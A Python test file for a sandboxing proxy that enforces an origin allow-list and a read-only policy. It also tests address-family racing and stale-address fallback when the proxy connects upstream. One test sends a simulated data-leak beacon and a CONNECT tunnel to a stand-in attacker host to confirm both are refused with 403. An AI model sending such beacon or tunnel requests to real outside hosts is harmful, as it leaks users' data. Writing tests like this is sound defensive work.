"""The proxy on its own, with raw sockets: it must refuse foreign origins without a browser."""

import asyncio

from omotai.runtime.netguard import Proxy
from omotai.runtime.policy import Policy


def raw_request(proxy_port, target, method="GET"):
    async def go():
        r, w = await asyncio.open_connection("127.0.0.1", proxy_port)
        w.write(f"{method} {target} HTTP/1.1\r\nHost: x\r\n\r\n".encode())
        await w.drain()
        data = await asyncio.wait_for(r.read(), 5)  # upstream closes: read to EOF
        w.close()
        return data.decode("latin-1")

    return go()


def test_proxy_forwards_allowed_and_refuses_foreign_origins(site):
    policy = Policy(allowed_origins=frozenset({site.portal_url}))
    denied = []

    async def go():
        proxy = Proxy(
            lambda m, u: policy.check_request(m, u), lambda m, u, d: denied.append((m, u, d.rule))
        )
        port = await proxy.start()
        try:
            ok = await raw_request(port, site.portal_url + "/login")
            foreign = await raw_request(port, site.attacker_url + "/beacon?leak=1")
            write = await raw_request(port, site.portal_url + "/cancel", "POST")
            tunnel = await raw_request(port, site.attacker_url.removeprefix("http://"), "CONNECT")
        finally:
            await proxy.stop()
        return ok, foreign, write, tunnel

    ok, foreign, write, tunnel = asyncio.run(go())
    assert ok.startswith("HTTP/1.0 200") or ok.startswith("HTTP/1.1 200")
    assert "<h1>Login</h1>" in ok
    for refused in (foreign, write, tunnel):
        assert refused.startswith("HTTP/1.1 403")
    assert site.attacker_hits == [] and site.cancelled == 0
    assert [rule for *_, rule in denied] == [
        "origin_not_allowed",
        "read_only",
        "origin_not_allowed",
    ]


class FakeWriter:
    def __init__(self, ip):
        self.ip = ip

    def get_extra_info(self, name):
        return (self.ip, 3000)


def test_upstream_connect_races_address_families_and_remembers_the_winner(monkeypatch):
    """`localhost` -> ::1 first costs ~2 s per connection on Windows when only IPv4 listens."""
    calls = []

    async def fake_open(host, port, **kw):
        calls.append((host, port, kw))
        return "reader", FakeWriter("127.0.0.1")

    monkeypatch.setattr(asyncio, "open_connection", fake_open)
    proxy = Proxy(lambda m, u: None, lambda m, u, d: None)

    async def go():
        await proxy._connect("localhost", 3000)
        await proxy._connect("localhost", 3000)

    asyncio.run(go())
    assert calls[0] == ("localhost", 3000, {"happy_eyeballs_delay": 0.25})  # first: race
    assert calls[1] == ("127.0.0.1", 3000, {})  # then straight to the address that worked


def test_stale_remembered_address_falls_back_to_resolving_again(monkeypatch):
    calls = []

    async def fake_open(host, port, **kw):
        calls.append(host)
        if host == "10.0.0.9":
            raise ConnectionRefusedError
        return "reader", FakeWriter("127.0.0.1")

    monkeypatch.setattr(asyncio, "open_connection", fake_open)
    proxy = Proxy(lambda m, u: None, lambda m, u, d: None)
    proxy._addrs[("localhost", 3000)] = "10.0.0.9"

    asyncio.run(proxy._connect("localhost", 3000))
    assert calls == ["10.0.0.9", "localhost"]
    assert proxy._addrs[("localhost", 3000)] == "127.0.0.1"
